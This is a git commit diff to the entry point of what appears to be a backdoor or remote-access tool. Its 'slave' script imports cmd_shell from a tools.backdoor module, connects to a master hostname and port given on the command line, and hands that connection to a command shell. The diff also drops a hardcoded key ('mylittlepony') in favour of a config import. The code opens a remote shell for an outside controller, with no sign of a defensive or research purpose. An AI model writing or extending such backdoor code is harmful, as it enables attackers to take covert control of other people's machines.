98c6636542740e641be475fd311f35bd85918756
trevalkov <rodrigolf080@gmail.com>
2022-01-08 14:32:42 +0000

    slave_done_missing_compilation

--- src/slave/main.py
+++ src/slave/main.py
@@ -1,17 +1,11 @@
 from utils.connection import connect_master
 from utils.args import get_args
 from tools.backdoor import cmd_shell
-
-KEY = ""
-# exit with os._exit(1) parent after forking
-def main():
-    global KEY
-    key = "mylittlepony"
-    KEY = bytes(key, 'utf-8')
-    master_hostname, master_port = get_args()
-    conn = connect_master(master_hostname, master_port)
-    cmd_shell(conn, master_hostname, master_port)
+from utils.configs import *
 
 
 if __name__ == "__main__":
-    main()
+    global KEY, master_hostname, master_port
+    setup()
+    conn = connect_master(master_hostname, master_port)
+    cmd_shell(conn, master_hostname, master_port)
